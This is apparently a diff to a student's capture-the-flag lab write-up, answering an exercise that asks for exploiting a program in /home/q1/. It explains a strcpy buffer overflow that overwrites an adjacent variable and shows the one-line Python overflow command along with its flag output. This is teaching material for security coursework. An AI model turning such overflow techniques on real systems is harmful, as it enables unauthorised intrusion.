@@ -4,12 +4,30 @@
 
 ###### Exercise 1
 
-
 > [!exercise]+ Exercise 1
 > Go to /home/q1/. Exploit the program to get the secret.
 > 
 > **Answer:**
-> Analysing the code in `run_me.c`, it becomes evident that we are trying to cause a buffer overflow inside `buffer` to overwrite `changeme`. An obvious hint to this is the use of `strcopy`, which is notorious for causing buffer overflows. 
-> 
-> To achieve this, we notice that `buffer` takes 1024 characters
+To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
+
+By supplying an input of 1025 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
+>```shell
+>student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
+ >_________________________________________
+>/ csf2024s1_{flockwise-overdiversificatio \
+>\ n-muriciform}                           /
+> -----------------------------------------
+>  \
+>   \
+>       __     
+>      UooU\.'@@@@@@`.
+>      \__/(@@@@@@@@@@)
+>           (@@@@@@@@)
+>           `YY~~~~YY'
+>            ||    ||
+>```
+
+<div style="page-break-after: always;"></div>
+
+###### Exercise 2
 
